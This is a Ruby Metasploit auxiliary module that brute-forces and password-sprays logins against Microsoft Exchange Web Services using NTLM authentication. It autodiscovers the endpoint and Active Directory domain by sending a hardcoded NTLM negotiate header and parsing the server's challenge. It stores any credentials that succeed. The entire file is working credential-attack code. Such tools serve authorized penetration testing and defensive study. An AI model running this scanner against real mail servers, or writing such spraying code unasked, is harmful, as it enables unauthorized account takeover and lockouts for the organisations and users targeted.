##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/proto/ntlm/message'
require 'metasploit/framework/login_scanner/owa_ews'
require 'metasploit/framework/credential_collection'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'           => 'OWA Exchange Web Services (EWS) Login Scanner',
      'Description'    => %q{
        This module attempts to log in to the Exchange Web Services, often
        exposed at https://example.com/ews/, using NTLM authentication. This
        method is faster and simpler than traditional form-based logins.

        In most cases, all you need to set is RHOSTS and some combination of
        user/pass files; the autodiscovery should find the location of the NTLM
        authentication point as well as the AD domain, and use them accordingly.
      },
      'Author'         => 'Rich Whitcroft',
      'License'        => MSF_LICENSE,
      'DefaultOptions' => { 'SSL' => true, 'VERBOSE' => false }
    )

    register_options(
      [
        OptBool.new('AUTODISCOVER', [ false, "Automatically discover domain URI", true ]),
        OptString.new('DOMAIN', [ false, "The Active Directory domain name", nil ]),
        OptString.new('TARGETURI', [ false, "The location of the NTLM service", nil ]),
        OptBool.new('PASSWORD_SPRAY', [ false, "Loop over passwords instead of usernames", true ]),
        OptInt.new('PASSWORDS_PER_CYCLE', [ false, "Passwords per cycle", nil ]),
        OptInt.new('CYCLE_DELAY', [ false, "Number of minutes to sleep between cycles", nil ]),
        Opt::RPORT(443)
      ])
  end

  def run
    domain = nil
    uri = nil

    if datastore['AUTODISCOVER']
      domain, uri = autodiscover
      if domain && uri
        print_good("Found NTLM service at #{uri} for domain #{domain}.")
      else
        print_error("Failed to autodiscover - try manually")
        return
      end
    elsif datastore['DOMAIN'] && datastore['TARGETURI']
      domain = datastore['DOMAIN']
      uri = datastore['TARGETURI']
      uri << "/" unless uri.chars.last == "/"
    else
      print_error("You must set DOMAIN and TARGETURI if not using autodiscover.")
      return
    end

    creds = Metasploit::Framework::CredentialCollection.new(
      blank_passwords: datastore['BLANK_PASSWORDS'],
      pass_file:       datastore['PASS_FILE'],
      password:        datastore['PASSWORD'],
      user_file:       datastore['USER_FILE'],
      userpass_file:   datastore['USERPASS_FILE'],
      username:        datastore['USERNAME'],
      user_as_pass:    datastore['USER_AS_PASS']
    )

    scanner = Metasploit::Framework::LoginScanner::OutlookWebAccessEWS.new(
      configure_http_login_scanner(
        uri:                 uri,
        vhost:               vhost || rhost,
        cred_details:        creds,
        stop_on_success:     datastore['STOP_ON_SUCCESS'],
        bruteforce_speed:    datastore['BRUTEFORCE_SPEED'],
        http_username:       datastore['HttpUsername'],
        http_password:       datastore['HttpPassword'],
        connection_timeout:  10,
        passwords_per_cycle: datastore['PASSWORDS_PER_CYCLE'] || 0,
        cycle_delay:         datastore['CYCLE_DELAY'] || 0,
        password_spray:      datastore['PASSWORD_SPRAY'],
        ntlm_domain:         domain
      )
    )

    scanner.scan! do |result|
      credential_data = result.to_h
      credential_data.merge!(
        module_fullname: fullname,
        workspace_id: myworkspace_id
      )
      if result.success?
        credential_core = create_credential(credential_data)
        credential_data[:core] = credential_core
        create_credential_login(credential_data)
        print_good "#{peer} - Login Successful: #{result.credential}"
      else
        invalidate_login(credential_data)
        vprint_error "#{peer} - Login failed: #{result.credential} (#{result.status})"
      end
    end
  end

  def autodiscover
    uris = %w[ /ews/ /rpc/ /public/ ]
    uris.each do |uri|
      begin
        res = send_request_cgi({
          'encode'   => true,
          'uri'      => uri,
          'method'   => 'GET',
          'headers'  => {'Authorization' => 'NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw=='}
        })
      rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
        print_error("HTTP Connection Failed")
        next
      end

      unless res
        print_error("HTTP Connection Timeout")
        next
      end

      if res && res.code == 401 && res.headers.has_key?('WWW-Authenticate') && res.headers['WWW-Authenticate'].match(/^NTLM/i)
        auth_blob = res['WWW-Authenticate'].split('NTLM ')[1]
        domain = Rex::Proto::NTLM::Message.parse(Rex::Text.decode_base64(auth_blob))[:target_name].value().gsub(/\0/,'')
        return domain, uri
      end
    end

    return nil, nil
  end
end
